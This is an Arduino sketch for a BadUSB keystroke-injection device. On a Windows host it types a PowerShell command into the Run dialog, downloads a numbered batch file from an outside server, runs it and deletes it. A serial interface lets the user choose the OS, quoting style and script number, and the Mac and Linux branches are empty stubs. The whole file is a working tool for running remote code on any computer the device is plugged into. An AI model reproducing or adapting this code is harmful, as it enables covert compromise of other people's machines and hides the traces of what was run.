#include <Keyboard.h>
#include <EEPROM.h>

void exec() {
  int os = EEPROM.read(0);
  int qu = EEPROM.read(1);
  String sc = String(EEPROM.read(2));
  String squotes[2] = {"'", "' "};
  String dquotes[2] = {"\"", "\" "};
  String s = squotes[qu];
  String d = dquotes[qu];

  Keyboard.begin();
  delay(500);

  if(os == 0) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(300);
    Keyboard.releaseAll();
    Keyboard.print("cmd /c "+d+"cd %userprofile%\\Downloads && powershell "+d+"(New-Object System.Net.WebClient).DownloadFile("+s+"https://wipeaut.nl/bad/win/"+sc+".bat"+s+", "+s+sc+".bat"+s+")"+d+" && "+sc+".bat && del "+sc+".bat"+d);
    delay(150);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
  } else if(os == 1) {
    // TODO: Mac
  } else if(os == 2) {
    // TODO: Linux
  }
}

void setup() {
  // if not ran before
  if(EEPROM.read(3) != 0) {
    for(int i = 0; i < 4; i++) {
      EEPROM.write(i, 0);
    }
  }

  Serial.begin(115200);

  delay(1000);

  if(Serial.available() != 0) {
    Serial.println("bad:"+String(EEPROM.read(0))+":"+String(EEPROM.read(1))+":"+String(EEPROM.read(2)));
    Serial.readString();

    while(true) {
      while(Serial.available() == 0) {
        // wait for message
      }

      String full = Serial.readString();
      String label = full.substring(0, 2);
      String val = full.substring(2);

      // write the os
      if(label == "os") {
        EEPROM.write(0, val.toInt());
        Serial.println("OS: "+String(val.toInt()));
      // write the quotes
      } else if(label == "qu") {
        EEPROM.write(1, val.toInt());
        Serial.println("QUOTES: "+String(val.toInt()));
      // write the script
      } else if(label == "sc") {
        EEPROM.write(2, val.toInt());
        Serial.println("SCRIPT: "+String(val.toInt()));
      // run the script
      } else if(label == "ru") {
        exec();
        Serial.println("RUNNING SCRIPT");
      }
    }
  } else {
    // if no program is connected
    exec();
  }
}

void loop() {
  // loop not neccesary
}
